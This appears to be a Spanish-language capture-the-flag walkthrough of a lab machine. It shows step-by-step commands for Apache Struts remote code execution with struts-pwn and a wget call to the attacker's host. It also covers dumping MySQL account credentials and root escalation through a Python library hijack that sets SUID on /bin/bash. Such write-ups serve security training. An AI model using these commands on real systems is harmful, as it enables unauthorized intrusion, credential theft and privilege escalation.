## Summary

- IP -> 10.10.10.64
- Ports -> TCP (20, 80, 8080), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 20 -> 
    - 80 -> 
    - 8080 -> 

## Recon
- Comando -> **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80
- Comando -> **whatweb http://< URL>:< PUERTO>** – Nos dara una breve descripcion del gestor de contenidos por puerto especifico

Miramos la pagina web
- Observamos su codigo fuente 

- Comando -> **wfuzz -c --hc=404 -t 200 -w < RUTA DICCIONARIO> < http:// url/FUZZ/>** Hacemos fuzing a una pagina web especifica para poder encontrar subdominios con un diccionario especifico, y el diccionario se aplicara en la palabra FUZZ (c=colorizado, w=wordlist, hc=hidecode, hh=hide characters ch en caso que sea necesario, t=tareas simultaneas). Es importante poner el nombre de la url, ya que muchas veces con la pura IP no encuentra nada. 
	- **/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 

Encontramos un dir llamado 'Monitoring'
El cual al momento de colocarlo en la url de la pagina web, podemos observar en la url que hay un 'Wlcome.action'
Ahora hacemos una busqueda en Google de **.action exploit**

Y encontramos en Github una url que se llama 'mazen160/struts...Apache strust'
Volvemos a buscar en Google que es ''apache struts' y nos sale  que es una herramienta de soporte para el desarrollo de aplicaciones web del patron MVC bajo la plataforma Java EE. 

Nos dirigimos a la pagina anterior de Github que habiamos encontrado
Nos clonamos el repo
- Comando -> **git clone https://github.com/mazen160/struts-pwn**
- Comando ->**python3 strust -h** Miramos el panel e ayuda del ejecutable en python3
- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'id'** Debemos de tener la extencion .action con ese comando nosotros podemos colocar un comando que si se ejecuta correcramente nos mostrara el id de la maquina victima.

Y con eso tenemos ejecucion remota de comandos.
- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'whoami'** Ejecutamos el comando whoami


- Comando -> **python3 -m http.server 80** Nos ponemos en escucha por el puerto 80
- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'which curl'** Para ver si tiene Curl
- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'which wget'** Para ver si tiene Curl
Miramos que si existe el comando Wget en la maquina victima
- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'wget http://10.10.14.12/test'** Para ver si recibimos algo, pero vemos que no.

- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'ls -l'** Para ver que hay en el directorio de la maquina victima, y encontramos db_connect

- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'cat db_connect'** Para ver que hay
dentro del file 'db_connect'

- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'which mysql'** Para ver si existe la base de datos 

- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'which mysqlshow'** Para ver si esta mysqlshow y asi poder hacer mejor la intercaccion 
- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'mysqlshow -uadmin -padmin'** Para ingresar a la base de datos
	u -> usuario 
	p -> password
El usuario y Passwd se pone seguidos despues de la u y p.


- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'mysqlshow -uadmin -padmin users'** Para ver que tablas tenemos, despues de saber el nombre de las bases de datos 

Para la tabla que encontramos que columnas existen.
- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'mysqlshow -uadmin -padmin users accounts'** 

Ya cuando lleguemos a la parte de los usuarios y passwd, podemos colocar el siguiente comando.
- Comando -> **python3 struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Welcome.action' -c 'mysql -uadmin -padmin -e "select * from accounts" users'** 
Colocando la base de datos al final y cambiamos el myslshow por mysql

Ahora tenemos un usuario y passwd

## User
- Comando -> **ssh < user>@< IP>** Para conectarnos por ssh 
Ahora podemos buscar la primer flag user.txt

- **uname -a** -> Miramos el Kernel y algunos detalles, amdx64 o x86, version. Buscar el Google si existe algun exploit.
- **lsb_release -a** -> Para ver que distribucion de Linux es
- **sudo -l** -> Para ver si tenemos privilegios en el Sudoers (l=ele), que podamos ejecutar comandos como (root) NOPASSWD
	- **sudo Command** -> Para poder ejecutar comando como root
Encontramos un archivo de Python que podemos ejecutar test.py pero no lo podemos modificar. Solo ejecutar 
- **cat test.py** -> Miramos el contenido del archivo python

	La tecnica que vamos a usar es un **Library Hijacking en Python3**

Podemos observar que se esta importando la libreria **Hashlib**, y con eso llamar haslib.md5
Y esta tecnica consiste en que cuando el script llame a la libreria, esta primero va a buscar en la ruta actual de trabajo y luego seguira con la ruta que corresponda. Estos es similar a la tecnica de **Path Hijacking de Bash** 

Por lo que debemos de crear un archivo en la ruta actual de trabajo: 
- **nano hashlib.py** 
	import os
	os.system("chmod u+s /bin/bash")

Para que en ese file podamos agregarle el privilegio SUI a la bash y asi poder temporalmente ser Root.

- **sudo -u root /usr/bin/python /home/richard/test.py** -> Para poder ejecutar el archivo en python
Y en ese punto hemos secuestrado la libreria 


## Root
Miramos la bash para ver is ha funcionado 
- **ls -l /bin/bash** -> Para ver los privilegios de la bash 
- **bash -p** -> Para ejecutar la bash y lanzarnos la consola como root cuando tiene permisos SUID o la s  (p=privilege)
